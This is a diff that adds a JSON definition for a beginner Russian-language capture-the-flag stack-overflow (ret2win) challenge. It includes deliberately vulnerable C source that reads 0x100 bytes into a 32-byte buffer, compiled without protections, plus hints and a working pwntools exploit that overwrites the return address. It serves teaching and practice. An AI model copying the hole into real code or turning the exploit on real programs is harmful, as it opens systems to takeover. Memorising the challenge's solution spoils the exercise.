@@ -1,0 +1,21 @@
+{
+  "kind": "pwn",
+  "title": "Звонок без приглашения",
+  "topic": "переполнение буфера на стеке, ret2win",
+  "difficulty": 1,
+  "statement": "Программа спрашивает имя и прощается. Где-то в ней есть функция, которая печатает флаг, но её никто не вызывает. Получи флаг.",
+  "hints": [
+    "Сколько байт читает программа и какого размера буфер?",
+    "Перезапиши сохранённый адрес возврата адресом функции win.",
+    "Смещение до адреса возврата: размер буфера + 8 байт сохранённого rbp. Адрес win: ELF('./chal').sym.win (PIE выключен).",
+    "payload = b'A'*40 + p64(ret) + p64(win): buf[32] + 8 байт rbp; лишний ret выравнивает стек до 16 байт, иначе puts внутри win может упасть на movaps."
+  ],
+  "source": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid win(void) {\n    char flag[64];\n    FILE *f = fopen(\"flag.txt\", \"r\");\n    if (!f) { puts(\"flag.txt не найден\"); exit(1); }\n    fgets(flag, sizeof flag, f);\n    puts(flag);\n    exit(0);\n}\n\nint main(void) {\n    char buf[32];\n    setvbuf(stdout, NULL, _IONBF, 0);\n    puts(\"Как тебя зовут?\");\n    read(0, buf, 0x100);\n    puts(\"Пока!\");\n    return 0;\n}\n",
+  "cflags": [
+    "-fno-stack-protector",
+    "-no-pie",
+    "-O0"
+  ],
+  "exploit": "from pwn import *\ncontext.log_level = 'error'\ne = ELF('./chal', checksec=False)\nret = ROP(e).find_gadget(['ret'])[0]\np = process('./chal')\np.sendafter('зовут?\\n'.encode(), b'A' * 40 + p64(ret) + p64(e.sym.win))\nprint(p.recvall(timeout=3).decode(errors='replace'))\n",
+  "give_source": true
+}
